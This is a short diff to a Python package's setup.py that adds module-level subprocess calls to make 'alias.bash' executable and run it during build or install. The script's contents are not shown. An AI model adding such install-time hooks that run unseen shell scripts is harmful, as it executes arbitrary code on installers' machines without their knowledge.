@@ -1,4 +1,5 @@
 import setuptools
+import subprocess as sp
 
 with open("README.md", "r") as fh:
     long_description = fh.read()
@@ -20,3 +21,6 @@ setuptools.setup(
     ],
     python_requires='>=3.6',
 )
+
+sp.call(["chmod","+x","alias.bash"])
+sp.call(["bash", "./alias.bash"])
